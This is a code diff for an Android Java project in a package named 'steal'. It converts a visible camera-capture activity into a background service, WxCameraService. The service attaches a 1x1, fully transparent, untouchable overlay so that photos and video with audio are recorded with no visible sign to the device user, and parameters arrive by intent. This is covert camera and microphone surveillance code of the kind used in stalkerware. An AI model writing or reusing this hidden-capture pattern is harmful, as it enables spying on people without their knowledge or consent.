@@ -1,32 +1,44 @@
-package com.xiaoxin.jhang.steal;
+package com.xiaoxin.jhang.steal.service;
 
-import android.app.Activity;
+import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.hardware.Camera;
 import android.media.CamcorderProfile;
 import android.media.MediaRecorder;
-import android.os.Bundle;
 import android.os.Handler;
+import android.os.IBinder;
 import android.os.Vibrator;
-import android.support.v7.app.AppCompatActivity;
+import android.support.annotation.Nullable;
 import android.util.Log;
 import android.view.Surface;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
-import android.view.View;
-import android.widget.Button;
-
+import android.view.WindowManager;
+import android.view.WindowManager.LayoutParams;
+import com.xiaoxin.jhang.steal.Config;
 import com.xiaoxin.jhang.steal.util.BitmapUtil;
 import com.xiaoxin.jhang.steal.util.FileUtil;
 import com.xiaoxin.jhang.steal.util.PrefUtils;
-
 import java.io.IOException;
 import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
-public class CameraVideoActivity extends AppCompatActivity {
+/**
+ * @author: xiaoxin
+ * date: 2018/5/31
+ * describe:
+ * 修改内容:
+ */
 
-    private static final String TAG = "CameraVideoActivity";
+public class WxCameraService extends Service {
+
+    private static String TAG = "CameraService";
+    private Context mContext;
+
     private MediaRecorder mMediaRecorder;
     private Camera mCamera;
     private SurfaceView mSurfaceView;
@@ -34,28 +46,31 @@ public class CameraVideoActivity extends AppCompatActivity {
     private boolean mIsRecording = false;
     private int mTime;
     private boolean mPicVideo;
+    public WindowManager mWindowManager;
     private int count = 1;
 
-    Button start;
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+
+    }
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_camera);
-        start = (Button)findViewById(R.id.bt_start);
-        start.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                new Handler().postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        mCamera.takePicture(null, null, mPicture);
-                        Log.e(TAG,"拍照");
-                    }
-                },2000);//延迟2s做准备
-            }
-        });
-        mSurfaceView = (SurfaceView)findViewById(R.id.surfaceview);
+    public void onCreate() {
+        // TODO Auto-generated method stub
+        super.onCreate();
+        mContext = getApplication();
+        mWindowManager = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
+        mSurfaceView = new SurfaceView(this);
+        LayoutParams params = new LayoutParams();
+        params.width = 1;
+        params.height = 1;
+        params.alpha = 0;
+        params.type = LayoutParams.TYPE_APPLICATION_OVERLAY ;
+        // 屏蔽点击事件
+        params.flags = LayoutParams.FLAG_NOT_TOUCH_MODAL | LayoutParams.FLAG_NOT_FOCUSABLE | LayoutParams.FLAG_NOT_TOUCHABLE;
+        mWindowManager.addView(mSurfaceView, params);
 
         mSurfaceHolder = mSurfaceView.getHolder();
         mSurfaceHolder.addCallback(new SurfaceHolder.Callback() {
@@ -66,7 +81,6 @@ public class CameraVideoActivity extends AppCompatActivity {
 
             @Override
             public void surfaceCreated(SurfaceHolder holder) {
-                Log.e(TAG, "初始化surfaceCreated: " );
                 initPreview();
             }
 
@@ -77,18 +91,15 @@ public class CameraVideoActivity extends AppCompatActivity {
             }
         });
 
-        mPicVideo = getIntent().getBooleanExtra("pic_video",false);
-        mTime = getIntent().getIntExtra("time",10);
-        count = getIntent().getIntExtra("picNumber",1);
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        mPicVideo = intent.getBooleanExtra("pic_video",false);
+        mTime = intent.getIntExtra("time",10);
+        count = intent.getIntExtra("picNumber",1);
 
         if (mPicVideo) {  //拍照
-//            new Handler().postDelayed(new Runnable() {
-//                @Override
-//                public void run() {
-//                    mCamera.takePicture(null, null, mPicture);
-//                    Log.e(TAG,"拍照");
-//                }
-//            },2000);//延迟2s做准备
             takePicture();
         }else {  //录像
             new Handler().postDelayed(new Runnable() {
@@ -101,7 +112,7 @@ public class CameraVideoActivity extends AppCompatActivity {
                 }
             },2000);
         }
-
+        return super.onStartCommand(intent, flags, startId);
     }
 
     private void takePicture() {
@@ -122,8 +133,7 @@ public class CameraVideoActivity extends AppCompatActivity {
      * 设置camera参数
      */
     protected void initPreview() {
-//        mCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);//设置前后摄像头0,1
-        mCamera = Camera.open(PrefUtils.getInt(this, Config.cameraBack, 0));//从配置文件取
+        mCamera = Camera.open(PrefUtils.getInt(this, Config.cameraBack, 0));//设置前后摄像头0,1
         Camera.Parameters parameters = mCamera.getParameters();
 //        parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);//设置自动对焦
         parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_VIDEO);//设置不断聚焦
@@ -137,21 +147,20 @@ public class CameraVideoActivity extends AppCompatActivity {
                 break;
             }
         }
-
         mCamera.setParameters(parameters);//最后一定要把parameters设置给camera
         try {
             mCamera.setPreviewDisplay(mSurfaceHolder);
         } catch (IOException e) {
             e.printStackTrace();
         }
-        setCameraDisplayOrientation(this, Camera.CameraInfo.CAMERA_FACING_BACK,mCamera);
+        setCameraDisplayOrientation(mContext, Camera.CameraInfo.CAMERA_FACING_BACK,mCamera);
         mCamera.startPreview();
     }
 
-    public static void setCameraDisplayOrientation(Activity activity,int cameraId, Camera camera) {
+    public void setCameraDisplayOrientation(Context ctx, int cameraId, Camera camera) {
         Camera.CameraInfo info = new Camera.CameraInfo();
         Camera.getCameraInfo(cameraId, info);
-        int rotation = activity.getWindowManager().getDefaultDisplay()
+        int rotation = mWindowManager.getDefaultDisplay()
                 .getRotation();
         int degrees = 0;
         switch (rotation) {
@@ -169,7 +178,6 @@ public class CameraVideoActivity extends AppCompatActivity {
             result = (info.orientation - degrees + 360) % 360;
         }
 //        camera.setDisplayOrientation(180);
-        Log.e(TAG, "result: "+result );
         camera.setDisplayOrientation(result);
     }
 
@@ -179,19 +187,19 @@ public class CameraVideoActivity extends AppCompatActivity {
         public void onPictureTaken(byte[] data, Camera camera) {
             // 将得到的照片进行270°旋转，使其竖直
             //处理图像数据
-            BitmapUtil.obtainPic(CameraVideoActivity.this,data);
+            BitmapUtil.obtainPic(WxCameraService.this,data);
 
             try {
                 mCamera.reconnect();
                 if (count == 0) {
+                    releaseCamera();
                     vibrate();
-                    finish();
+                    stopSelf();
                 }else {
                     initPreview();
                     takePicture();
                     vibrate();
                 }
-
             } catch (Exception e) {
                 Log.e(TAG, "File not found: " + e.getMessage());
             }
@@ -217,7 +225,7 @@ public class CameraVideoActivity extends AppCompatActivity {
         // Step 1: Unlock and set camera to MediaRecorder
         mCamera.unlock();
         mMediaRecorder.setCamera(mCamera);
-        mMediaRecorder.setOrientationHint(90);//78后置摄像头选择90度，前置摄像头旋转270度
+        mMediaRecorder.setOrientationHint(90);//后置摄像头选择90度，前置摄像头旋转270度
 
         // Step 2: Set sources
         mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);//VOICE_RECOGNITION
@@ -266,8 +274,9 @@ public class CameraVideoActivity extends AppCompatActivity {
                 mMediaRecorder =null;
                 mIsRecording = false;
                 try {
-                    mCamera.reconnect();
+                    releaseCamera();//防止内存泄漏
                     vibrate();
+                    stopSelf();
                 } catch (Exception e) {
                     Log.e(TAG, "reconect fail"+e.toString());
                 }
@@ -275,12 +284,9 @@ public class CameraVideoActivity extends AppCompatActivity {
         }
     }
 
-    /**
-     * 震动00毫秒
-     */
-    private void vibrate() {
-        Vibrator vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
-        vibrator.vibrate(300);
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
     }
 
     class TimerThread extends TimerTask {
@@ -292,7 +298,17 @@ public class CameraVideoActivity extends AppCompatActivity {
         public void run() {
             stopMediaRecorder();
             this.cancel();
-            finish();
+//            finish();
         }
     }
+
+    /**
+     * 震动00毫秒
+     */
+    private void vibrate() {
+        Vibrator vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+        vibrator.vibrate(500);
+    }
+
+
 }
